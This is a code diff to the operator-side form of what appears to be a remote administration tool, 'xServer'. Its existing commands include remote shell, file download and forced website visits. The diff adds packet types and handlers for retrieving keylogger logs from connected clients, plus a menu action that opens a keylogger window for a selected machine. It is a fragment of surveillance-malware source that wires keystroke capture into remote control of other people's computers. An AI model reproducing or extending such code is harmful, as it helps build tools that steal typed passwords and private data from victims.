@@ -103,6 +103,7 @@ namespace xServer.Forms
                 typeof(Core.Packets.ServerPackets.Drives),
                 typeof(Core.Packets.ServerPackets.Directory),
                 typeof(Core.Packets.ServerPackets.DownloadFile),
+                typeof(Core.Packets.ServerPackets.GetLogs),
                 typeof(Core.Packets.ServerPackets.MouseClick),
                 typeof(Core.Packets.ServerPackets.GetSystemInfo),
                 typeof(Core.Packets.ServerPackets.VisitWebsite),
@@ -124,6 +125,7 @@ namespace xServer.Forms
                 typeof(Core.Packets.ClientPackets.DrivesResponse),
                 typeof(Core.Packets.ClientPackets.DirectoryResponse),
                 typeof(Core.Packets.ClientPackets.DownloadFileResponse),
+                typeof(Core.Packets.ClientPackets.GetLogsResponse),
                 typeof(Core.Packets.ClientPackets.GetSystemInfoResponse),
                 typeof(Core.Packets.ClientPackets.MonitorsResponse),
                 typeof(Core.Packets.ClientPackets.ShellCommandResponse),
@@ -242,6 +244,10 @@ namespace xServer.Forms
             else if (type == typeof(Core.Packets.ClientPackets.DownloadFileResponse))
             {
                 CommandHandler.HandleDownloadFileResponse(client, (Core.Packets.ClientPackets.DownloadFileResponse)packet);
+            }
+            else if (type == typeof(Core.Packets.ClientPackets.GetLogsResponse))
+            {
+                CommandHandler.HandleGetLogsResponse(client, (Core.Packets.ClientPackets.GetLogsResponse)packet);
             }
             else if (type == typeof(Core.Packets.ClientPackets.GetSystemInfoResponse))
             {
@@ -470,6 +476,21 @@ namespace xServer.Forms
                     // TODO
                 }
             }
+
+            private void ctxtKeylogger_Click(object sender, EventArgs e)
+            {
+                if (lstClients.SelectedItems.Count != 0)
+                {
+                    Client c = (Client)lstClients.SelectedItems[0].Tag;
+                    if (c.Value.FrmKl != null)
+                    {
+                        c.Value.FrmKl.Focus();
+                        return;
+                    }
+                    FrmKeylogger frmKL = new FrmKeylogger(c);
+                    frmKL.Show();
+                }
+            }
             #endregion
             
             #region "Miscellaneous"
@@ -619,5 +640,6 @@ namespace xServer.Forms
             this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
         }
         #endregion
+
     }
 }
